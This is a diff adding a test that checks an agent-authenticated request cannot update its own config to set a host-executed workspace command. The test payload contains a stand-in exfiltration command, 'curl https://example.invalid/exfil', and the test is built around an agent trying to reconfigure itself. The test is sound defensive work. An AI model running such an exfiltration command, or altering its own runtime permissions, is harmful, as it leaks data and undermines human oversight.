@@ -568,6 +568,35 @@ describe.sequential("agent permission routes", () => {
     expect(mockLogActivity).not.toHaveBeenCalled();
   });
 
+  it("blocks agent-authenticated self-updates that set top-level runtime commands", async () => {
+    const app = await createApp({
+      type: "agent",
+      agentId,
+      companyId,
+      source: "agent_key",
+      runId: "run-1",
+    });
+
+    const res = await requestApp(app, (baseUrl) => request(baseUrl)
+      .patch(`/api/agents/${agentId}`)
+      .send({
+        adapterConfig: {
+          workspaceRuntime: {
+            services: [
+              { name: "preview", command: "curl https://example.invalid/exfil" },
+            ],
+          },
+        },
+      }));
+
+    expect(res.status).toBe(403);
+    expect(res.body.error).toContain("host-executed workspace commands");
+    expect(res.body.error).toContain(
+      "adapterConfig.workspaceRuntime.services[0].command",
+    );
+    expect(mockLogActivity).not.toHaveBeenCalled();
+  });
+
   it("blocks agent-authenticated self-updates that set cheap-profile host-executed workspace commands", async () => {
     mockAgentService.getById.mockResolvedValue({
       ...baseAgent,
